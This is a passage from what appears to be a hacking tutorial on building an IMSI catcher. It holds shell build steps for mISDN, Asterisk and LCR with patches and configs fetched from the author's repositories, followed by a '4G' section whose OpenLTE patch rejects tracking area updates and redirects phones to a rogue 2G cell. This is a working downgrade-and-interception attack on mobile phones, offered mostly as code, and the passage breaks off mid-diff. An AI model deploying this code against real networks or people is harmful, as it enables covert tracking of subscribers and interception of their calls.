<span id="cb4-117"><a href="#cb4-117" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /opt/IMSI_Catcher/mISDN/standalone/drivers/isdn/mISDN/modules.order /usr/src/linux-headers-<span class="va">$(</span><span class="fu">uname</span> <span class="at">-r</span><span class="va">)</span></span>
<span id="cb4-118"><a href="#cb4-118" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> <span class="at">-rn</span> /usr/lib/modules/<span class="va">$(</span><span class="fu">uname</span> <span class="at">-r</span><span class="va">)</span>/. /usr/src/linux-headers-<span class="va">$(</span><span class="fu">uname</span> <span class="at">-r</span><span class="va">)</span></span>
<span id="cb4-119"><a href="#cb4-119" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> modules_install</span>
<span id="cb4-120"><a href="#cb4-120" aria-hidden="true" tabindex="-1"></a><span class="ex">depmod</span> <span class="at">-a</span></span>
<span id="cb4-121"><a href="#cb4-121" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-122"><a href="#cb4-122" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-7</span>
<span id="cb4-123"><a href="#cb4-123" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-124"><a href="#cb4-124" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-125"><a href="#cb4-125" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install bison flex <span class="at">-y</span></span>
<span id="cb4-126"><a href="#cb4-126" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/isdn4linux/mISDNuser</span>
<span id="cb4-127"><a href="#cb4-127" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher/mISDNuser</span>
<span id="cb4-128"><a href="#cb4-128" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb4-129"><a href="#cb4-129" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb4-130"><a href="#cb4-130" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb4-131"><a href="#cb4-131" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb4-132"><a href="#cb4-132" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb4-133"><a href="#cb4-133" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> example</span>
<span id="cb4-134"><a href="#cb4-134" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb4-135"><a href="#cb4-135" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb4-136"><a href="#cb4-136" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb4-137"><a href="#cb4-137" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb4-138"><a href="#cb4-138" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-139"><a href="#cb4-139" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-9</span>
<span id="cb4-140"><a href="#cb4-140" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-141"><a href="#cb4-141" aria-hidden="true" tabindex="-1"></a><span class="co">#Asterisk version (11.25.3) :</span></span>
<span id="cb4-142"><a href="#cb4-142" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> http://downloads.asterisk.org/pub/telephony/asterisk/releases/asterisk-11.25.3.tar.gz</span>
<span id="cb4-143"><a href="#cb4-143" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> zxvf asterisk-11.25.3.tar.gz</span>
<span id="cb4-144"><a href="#cb4-144" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher/asterisk-11.25.3</span>
<span id="cb4-145"><a href="#cb4-145" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install libncurses-dev libxml2-dev</span>
<span id="cb4-146"><a href="#cb4-146" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://raw.githubusercontent.com/bbaranoff/telco_install_sh/main/tcptls.patch</span>
<span id="cb4-147"><a href="#cb4-147" aria-hidden="true" tabindex="-1"></a><span class="fu">patch</span> <span class="at">-p1</span> <span class="op">&lt;</span> tcptls.patch</span>
<span id="cb4-148"><a href="#cb4-148" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb4-149"><a href="#cb4-149" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> <span class="at">-j</span><span class="va">$(</span><span class="fu">nproc</span><span class="va">)</span></span>
<span id="cb4-150"><a href="#cb4-150" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb4-151"><a href="#cb4-151" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> samples</span>
<span id="cb4-152"><a href="#cb4-152" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> config</span>
<span id="cb4-153"><a href="#cb4-153" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb4-154"><a href="#cb4-154" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-5</span>
<span id="cb4-155"><a href="#cb4-155" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-156"><a href="#cb4-156" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/fairwaves/lcr</span>
<span id="cb4-157"><a href="#cb4-157" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> lcr</span>
<span id="cb4-158"><a href="#cb4-158" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://raw.githubusercontent.com/bbaranoff/PImpMyPi/main/ast_lcr.patch</span>
<span id="cb4-159"><a href="#cb4-159" aria-hidden="true" tabindex="-1"></a><span class="fu">patch</span> <span class="at">-p0</span> <span class="op">&lt;</span> ast_lcr.patch</span>
<span id="cb4-160"><a href="#cb4-160" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-i</span></span>
<span id="cb4-161"><a href="#cb4-161" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span> <span class="at">--with-sip</span> <span class="at">--with-gsm-bs</span> <span class="at">--with-gsm-ms</span> <span class="at">--with-asterisk</span></span>
<span id="cb4-162"><a href="#cb4-162" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb4-163"><a href="#cb4-163" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb4-164"><a href="#cb4-164" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb4-165"><a href="#cb4-165" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> chan_lcr.so /usr/lib/asterisk/modules/</span>
<span id="cb4-166"><a href="#cb4-166" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-get</span> install alsa-oss</span>
<span id="cb4-167"><a href="#cb4-167" aria-hidden="true" tabindex="-1"></a><span class="ex">modprobe</span> snd-pcm</span>
<span id="cb4-168"><a href="#cb4-168" aria-hidden="true" tabindex="-1"></a><span class="ex">modprobe</span> snd-mixer-oss</span>
<span id="cb4-169"><a href="#cb4-169" aria-hidden="true" tabindex="-1"></a><span class="ex">modprobe</span> mISDN_core</span>
<span id="cb4-170"><a href="#cb4-170" aria-hidden="true" tabindex="-1"></a><span class="ex">modprobe</span> mISDN_dsp</span>
<span id="cb4-171"><a href="#cb4-171" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="at">-rf</span> /usr/local/etc/lcr</span>
<span id="cb4-172"><a href="#cb4-172" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> /usr/local/etc/</span>
<span id="cb4-173"><a href="#cb4-173" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/bbaranoff/lcr_conf /usr/local/etc/lcr/</span>
<span id="cb4-174"><a href="#cb4-174" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> chmod 755 /usr/local/etc/lcr</span>
<span id="cb4-175"><a href="#cb4-175" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> chmod 644 /usr/local/etc/lcr/<span class="pp">*</span></span>
<span id="cb4-176"><a href="#cb4-176" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /etc/asterisk</span>
<span id="cb4-177"><a href="#cb4-177" aria-hidden="true" tabindex="-1"></a><span class="fu">mv</span> sip.conf sip.conf.bak</span>
<span id="cb4-178"><a href="#cb4-178" aria-hidden="true" tabindex="-1"></a><span class="fu">mv</span> extensions.conf extensions.conf.bak</span>
<span id="cb4-179"><a href="#cb4-179" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://raw.githubusercontent.com/bbaranoff/telco_install_sh/main/sip.conf</span>
<span id="cb4-180"><a href="#cb4-180" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://raw.githubusercontent.com/bbaranoff/telco_install_sh/main/extensions.conf</span>
<span id="cb4-181"><a href="#cb4-181" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> /root/nitb</span>
<span id="cb4-182"><a href="#cb4-182" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /root/nitb</span>
<span id="cb4-183"><a href="#cb4-183" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://raw.githubusercontent.com/bbaranoff/telco_install_sh/main/openbsc.cfg</span>
<span id="cb4-184"><a href="#cb4-184" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://raw.githubusercontent.com/bbaranoff/telco_install_sh/main/nitb.sh</span>
<span id="cb4-185"><a href="#cb4-185" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x nitb.sh</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>In <a href="https://github.com/bbaranoff/telco_install_sh" class="uri">https://github.com/bbaranoff/telco_install_sh</a></p>
<p>Follow the ReadMe and all should be OK.</p>
<p><a href="https://www.youtube.com/watch?v=gHKmmVZAaFo">IMSI-Catcher 2G</a></p>
<p>Now we have hacked 2G outgoing calls what to do ?</p>
<p>I let as a reader research Yate, OpenBTS, Network In the Box ;)</p>
<p>Now we have hacked 2G outgoing calls what to do ?</p>
</section>
</section>
<section id="hacking-4g" class="level1">
<h1>Hacking 4G !</h1>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="diagram1_2G_act2.png"><img src="diagram1_2G_act2.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">4G Attack Active</figcaption>
</figure>
</div>
<p>newpage</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="diagram1_2G_act3.png"><img src="diagram1_2G_act3.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">4G Attack Active</figcaption>
</figure>
</div>
<p>What is the way ? Now the eNodeB (evolved Node BTS the 4G BTS) must authenticate with the phone... What to do then ? Fallback into 2G ! The phone before authenticate send a tracking area update request and the eNodeB respond it with a TAU accept what we will do then ? Reject It ! Say that only 2G is available in the area ;)</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode patch code-with-copy"><code class="sourceCode diff"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">--- openlte_v00-20-05/liblte/src/liblte_rrc.cc  2016-10-09 22:17:50.000000000 +0200</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ openlte_v00-20-05/liblte/src/liblte_rrc.cc  2022-01-25 17:14:32.613323868 +0100</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -11698,13 +11698,28 @@</span></span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>         liblte_value_2_bits(0, &amp;msg_ptr, 2);</span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>         // Optional indicators</span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="st">-        liblte_value_2_bits(0, &amp;msg_ptr, 1);</span></span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="va">+        liblte_value_2_bits(1, &amp;msg_ptr, 1);</span></span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>         liblte_value_2_bits(0, &amp;msg_ptr, 1);</span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>         liblte_value_2_bits(0, &amp;msg_ptr, 1);</span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>         // Release cause</span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>         liblte_value_2_bits(con_release-&gt;release_cause, &amp;msg_ptr, 2);</span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a><span class="va">+// redirectedcarrierinfo</span></span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a><span class="va">+// geran // choice</span></span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="va">+liblte_value_2_bits(1, &amp;msg_ptr, 4);</span></span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a><span class="va">+// arfcn no.</span></span>
<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="va">+liblte_value_2_bits(514, &amp;msg_ptr, 10);</span></span>
<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="va">+// dcs1800</span></span>
<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a><span class="va">+liblte_value_2_bits(0, &amp;msg_ptr, 1);</span></span>
<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a><span class="va">+// Choice of following ARFCN</span></span>
<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a><span class="va">+liblte_value_2_bits(0, &amp;msg_ptr, 2);</span></span>
<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a><span class="va">+// explicit list</span></span>
<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a><span class="va">+liblte_value_2_bits(1, &amp;msg_ptr, 5);</span></span>
<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a><span class="va">+// arfcn no.</span></span>
<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a><span class="va">+liblte_value_2_bits(514, &amp;msg_ptr, 10);</span></span>
<span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a><span class="va">+// Note that total bits should be octet aligned,</span></span>
<span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a><span class="va">+// if not, pad it with zeros.</span></span>
<span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a>         // Fill in the number of bits used</span>
<span id="cb5-31"><a href="#cb5-31" aria-hidden="true" tabindex="-1"></a>         msg-&gt;N_bits = msg_ptr - msg-&gt;msg;</span>
<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a><span class="kw">--- openlte_v00-20-05/LTE_fdd_enodeb/hdr/LTE_fdd_enb_mme.h  2017-07-29 21:58:37.000000000 +0200</span></span>
<span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ openlte_v00-20-05/LTE_fdd_enodeb/hdr/LTE_fdd_enb_mme.h  2022-01-25 16:49:13.365515919 +0100</span></span>
<span id="cb5-35"><a href="#cb5-35" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -106,6 +106,7 @@</span></span>
<span id="cb5-36"><a href="#cb5-36" aria-hidden="true" tabindex="-1"></a>     // Message Parsers</span>
<span id="cb5-37"><a href="#cb5-37" aria-hidden="true" tabindex="-1"></a>     void parse_attach_complete(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span>
<span id="cb5-38"><a href="#cb5-38" aria-hidden="true" tabindex="-1"></a>     void parse_attach_request(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user **user, LTE_fdd_enb_rb **rb);</span>
<span id="cb5-39"><a href="#cb5-39" aria-hidden="true" tabindex="-1"></a><span class="va">+    void send_tracking_area_update_request(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user **user, LTE_fdd_enb_rb **rb);</span></span>
<span id="cb5-40"><a href="#cb5-40" aria-hidden="true" tabindex="-1"></a>     void parse_authentication_failure(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span>
<span id="cb5-41"><a href="#cb5-41" aria-hidden="true" tabindex="-1"></a>     void parse_authentication_response(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span>
<span id="cb5-42"><a href="#cb5-42" aria-hidden="true" tabindex="-1"></a>     void parse_detach_request(LIBLTE_BYTE_MSG_STRUCT *msg, LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span>
<span id="cb5-43"><a href="#cb5-43" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -125,6 +126,8 @@</span></span>
<span id="cb5-44"><a href="#cb5-44" aria-hidden="true" tabindex="-1"></a>     // Message Senders</span>
<span id="cb5-45"><a href="#cb5-45" aria-hidden="true" tabindex="-1"></a>     void send_attach_accept(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span>
<span id="cb5-46"><a href="#cb5-46" aria-hidden="true" tabindex="-1"></a>     void send_attach_reject(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span>
<span id="cb5-47"><a href="#cb5-47" aria-hidden="true" tabindex="-1"></a><span class="va">+    void send_tracking_area_update_request(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span></span>
<span id="cb5-48"><a href="#cb5-48" aria-hidden="true" tabindex="-1"></a><span class="va">+    void send_tracking_area_update_reject(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span></span>
<span id="cb5-49"><a href="#cb5-49" aria-hidden="true" tabindex="-1"></a>     void send_authentication_reject(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span>
<span id="cb5-50"><a href="#cb5-50" aria-hidden="true" tabindex="-1"></a>     void send_authentication_request(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span>
<span id="cb5-51"><a href="#cb5-51" aria-hidden="true" tabindex="-1"></a>     void send_detach_accept(LTE_fdd_enb_user *user, LTE_fdd_enb_rb *rb);</span>
<span id="cb5-52"><a href="#cb5-52" aria-hidden="true" tabindex="-1"></a><span class="kw">--- openlte_v00-20-05/LTE_fdd_enodeb/hdr/LTE_fdd_enb_rb.h   2017-07-29 22:03:51.000000000 +0200</span></span>
<span id="cb5-53"><a href="#cb5-53" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ openlte_v00-20-05/LTE_fdd_enodeb/hdr/LTE_fdd_enb_rb.h   2022-01-25 16:49:13.365515919 +0100</span></span>
<span id="cb5-54"><a href="#cb5-54" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -99,18 +99,21 @@</span></span>
<span id="cb5-55"><a href="#cb5-55" aria-hidden="true" tabindex="-1"></a> typedef enum{</span>
<span id="cb5-56"><a href="#cb5-56" aria-hidden="true" tabindex="-1"></a>     LTE_FDD_ENB_MME_PROC_IDLE = 0,</span>
<span id="cb5-57"><a href="#cb5-57" aria-hidden="true" tabindex="-1"></a>     LTE_FDD_ENB_MME_PROC_ATTACH,</span>
<span id="cb5-58"><a href="#cb5-58" aria-hidden="true" tabindex="-1"></a><span class="va">+    LTE_FDD_ENB_MME_PROC_TAU_REQUEST,</span></span>
<span id="cb5-59"><a href="#cb5-59" aria-hidden="true" tabindex="-1"></a>     LTE_FDD_ENB_MME_PROC_SERVICE_REQUEST,</span>
<span id="cb5-60"><a href="#cb5-60" aria-hidden="true" tabindex="-1"></a>     LTE_FDD_ENB_MME_PROC_DETACH,</span>
<span id="cb5-61"><a href="#cb5-61" aria-hidden="true" tabindex="-1"></a>     LTE_FDD_ENB_MME_PROC_N_ITEMS,</span>
<span id="cb5-62"><a href="#cb5-62" aria-hidden="true" tabindex="-1"></a> }LTE_FDD_ENB_MME_PROC_ENUM;</span>
<span id="cb5-63"><a href="#cb5-63" aria-hidden="true" tabindex="-1"></a> static const char LTE_fdd_enb_mme_proc_text[LTE_FDD_ENB_MME_PROC_N_ITEMS][100] = {"IDLE",</span>
<span id="cb5-64"><a href="#cb5-64" aria-hidden="true" tabindex="-1"></a>                                                                                   "ATTACH",</span>
<span id="cb5-65"><a href="#cb5-65" aria-hidden="true" tabindex="-1"></a><span class="va">+                                         "TAU REQUEST",</span></span>
<span id="cb5-66"><a href="#cb5-66" aria-hidden="true" tabindex="-1"></a>                                                                                   "SERVICE REQUEST",</span>
<span id="cb5-67"><a href="#cb5-67" aria-hidden="true" tabindex="-1"></a>                                                                                   "DETACH"};</span>
<span id="cb5-68"><a href="#cb5-68" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-69"><a href="#cb5-69" aria-hidden="true" tabindex="-1"></a> typedef enum{</span>
<span id="cb5-70"><a href="#cb5-70" aria-hidden="true" tabindex="-1"></a>     LTE_FDD_ENB_MME_STATE_IDLE = 0,</span>
<span id="cb5-71"><a href="#cb5-71" aria-hidden="true" tabindex="-1"></a>     LTE_FDD_ENB_MME_STATE_ID_REQUEST_IMSI,</span>
<span id="cb5-72"><a href="#cb5-72" aria-hidden="true" tabindex="-1"></a><span class="va">+LTE_FDD_ENB_MME_STATE_TAU_REJECT,</span></span>
<span id="cb5-73"><a href="#cb5-73" aria-hidden="true" tabindex="-1"></a>     LTE_FDD_ENB_MME_STATE_REJECT,</span>
<span id="cb5-74"><a href="#cb5-74" aria-hidden="true" tabindex="-1"></a>     LTE_FDD_ENB_MME_STATE_AUTHENTICATE,</span>
<span id="cb5-75"><a href="#cb5-75" aria-hidden="true" tabindex="-1"></a>     LTE_FDD_ENB_MME_STATE_AUTH_REJECTED,</span>
<span id="cb5-76"><a href="#cb5-76" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -126,7 +129,7 @@</span></span>
<span id="cb5-77"><a href="#cb5-77" aria-hidden="true" tabindex="-1"></a> }LTE_FDD_ENB_MME_STATE_ENUM;</span>
<span id="cb5-78"><a href="#cb5-78" aria-hidden="true" tabindex="-1"></a> static const char LTE_fdd_enb_mme_state_text[LTE_FDD_ENB_MME_STATE_N_ITEMS][100] = {"IDLE",</span>
<span id="cb5-79"><a href="#cb5-79" aria-hidden="true" tabindex="-1"></a>                                                                                     "ID REQUEST IMSI",</span>
<span id="cb5-80"><a href="#cb5-80" aria-hidden="true" tabindex="-1"></a><span class="st">-                                                                                    "REJECT",</span></span>
<span id="cb5-81"><a href="#cb5-81" aria-hidden="true" tabindex="-1"></a><span class="va">+                                                                       "REJECT",</span></span>
<span id="cb5-82"><a href="#cb5-82" aria-hidden="true" tabindex="-1"></a>                                                                                     "AUTHENTICATE",</span>
<span id="cb5-83"><a href="#cb5-83" aria-hidden="true" tabindex="-1"></a>                                                                                     "AUTH REJECTED",</span>
<span id="cb5-84"><a href="#cb5-84" aria-hidden="true" tabindex="-1"></a>                                                                                     "ENABLE SECURITY",</span>
<span id="cb5-85"><a href="#cb5-85" aria-hidden="true" tabindex="-1"></a><span class="kw">--- openlte_v00-20-05/LTE_fdd_enodeb/src/LTE_fdd_enb_mme.cc 2017-07-29 22:15:50.000000000 +0200</span></span>
<span id="cb5-86"><a href="#cb5-86" aria-hidden="true" tabindex="-1"></a><span class="dt">+++ openlte_v00-20-05/LTE_fdd_enodeb/src/LTE_fdd_enb_mme.cc 2022-01-25 17:07:55.380027792 +0100</span></span>
<span id="cb5-87"><a href="#cb5-87" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -204,6 +204,10 @@</span></span>
<span id="cb5-88"><a href="#cb5-88" aria-hidden="true" tabindex="-1"></a>         case LIBLTE_MME_MSG_TYPE_ATTACH_REQUEST:</span>
<span id="cb5-89"><a href="#cb5-89" aria-hidden="true" tabindex="-1"></a>             parse_attach_request(msg, &amp;nas_msg-&gt;user, &amp;nas_msg-&gt;rb);</span>
<span id="cb5-90"><a href="#cb5-90" aria-hidden="true" tabindex="-1"></a>             break;</span>
<span id="cb5-91"><a href="#cb5-91" aria-hidden="true" tabindex="-1"></a><span class="va">+        case LTE_FDD_ENB_MME_PROC_TAU_REQUEST:</span></span>
<span id="cb5-92"><a href="#cb5-92" aria-hidden="true" tabindex="-1"></a><span class="va">+            send_tracking_area_update_request(msg, &amp;nas_msg-&gt;user, &amp;nas_msg-&gt;rb);</span></span>
<span id="cb5-93"><a href="#cb5-93" aria-hidden="true" tabindex="-1"></a><span class="va">+            break;</span></span>
<span id="cb5-94"><a href="#cb5-94" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-95"><a href="#cb5-95" aria-hidden="true" tabindex="-1"></a>         case LIBLTE_MME_MSG_TYPE_AUTHENTICATION_FAILURE:</span>
<span id="cb5-96"><a href="#cb5-96" aria-hidden="true" tabindex="-1"></a>             parse_authentication_failure(msg, nas_msg-&gt;user, nas_msg-&gt;rb);</span>
<span id="cb5-97"><a href="#cb5-97" aria-hidden="true" tabindex="-1"></a>             break;</span>
<span id="cb5-98"><a href="#cb5-98" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -655,6 +659,16 @@</span></span>
<span id="cb5-99"><a href="#cb5-99" aria-hidden="true" tabindex="-1"></a>         }</span>
<span id="cb5-100"><a href="#cb5-100" aria-hidden="true" tabindex="-1"></a>     }</span>
<span id="cb5-101"><a href="#cb5-101" aria-hidden="true" tabindex="-1"></a> }</span>
<span id="cb5-102"><a href="#cb5-102" aria-hidden="true" tabindex="-1"></a><span class="va">+void LTE_fdd_enb_mme::send_tracking_area_update_request(LIBLTE_BYTE_MSG_STRUCT  *msg,</span></span>
<span id="cb5-103"><a href="#cb5-103" aria-hidden="true" tabindex="-1"></a><span class="va">+                                           LTE_fdd_enb_user       **user,</span></span>
<span id="cb5-104"><a href="#cb5-104" aria-hidden="true" tabindex="-1"></a><span class="va">+                                           LTE_fdd_enb_rb         **rb)</span></span>
<span id="cb5-105"><a href="#cb5-105" aria-hidden="true" tabindex="-1"></a><span class="va">+{</span></span>
<span id="cb5-106"><a href="#cb5-106" aria-hidden="true" tabindex="-1"></a><span class="va">+    // Set the procedure</span></span>
<span id="cb5-107"><a href="#cb5-107" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-108"><a href="#cb5-108" aria-hidden="true" tabindex="-1"></a><span class="va">+(*rb) -&gt; set_mme_procedure(LTE_FDD_ENB_MME_PROC_TAU_REQUEST);</span></span>
<span id="cb5-109"><a href="#cb5-109" aria-hidden="true" tabindex="-1"></a><span class="va">+(*rb) -&gt; set_mme_state(LTE_FDD_ENB_MME_STATE_TAU_REJECT);}</span></span>
<span id="cb5-110"><a href="#cb5-110" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-111"><a href="#cb5-111" aria-hidden="true" tabindex="-1"></a><span class="va">+</span></span>
<span id="cb5-112"><a href="#cb5-112" aria-hidden="true" tabindex="-1"></a> void LTE_fdd_enb_mme::parse_authentication_failure(LIBLTE_BYTE_MSG_STRUCT *msg,</span>
<span id="cb5-113"><a href="#cb5-113" aria-hidden="true" tabindex="-1"></a>                                                    LTE_fdd_enb_user       *user,</span>
<span id="cb5-114"><a href="#cb5-114" aria-hidden="true" tabindex="-1"></a>                                                    LTE_fdd_enb_rb         *rb)</span>
<span id="cb5-115"><a href="#cb5-115" aria-hidden="true" tabindex="-1"></a><span class="dt">@@ -864,7 +878,7 @@</span></span>
<span id="cb5-116"><a href="#cb5-116" aria-hidden="true" tabindex="-1"></a>                 rb-&gt;set_mme_state(LTE_FDD_ENB_MME_STATE_AUTHENTICATE);</span>
<span id="cb5-117"><a href="#cb5-117" aria-hidden="true" tabindex="-1"></a>                 user-&gt;set_id(hss-&gt;get_user_id_from_imei(imei_num));</span>
<span id="cb5-118"><a href="#cb5-118" aria-hidden="true" tabindex="-1"></a>             }else{</span>
<span id="cb5-119"><a href="#cb5-119" aria-hidden="true" tabindex="-1"></a><span class="st">-                user-&gt;set_emm_cause(LIBLTE_MME_EMM_CAUSE_UE_SECURITY_CAPABILITIES_MISMATCH);</span></span>
<span id="cb5-120"><a href="#cb5-120" aria-hidden="true" tabindex="-1"></a><span class="va">+                user-&gt;set_emm_cause(LIBLTE_MME_EMM_CAUSE_UE_IDENTITY_CANNOT_BE_DERIVED_BY_THE_NETWORK);</span></span>
<span id="cb5-121"><a href="#cb5-121" aria-hidden="true" tabindex="-1"></a>                 rb-&gt;set_mme_state(LTE_FDD_ENB_MME_STATE_REJECT);</span>
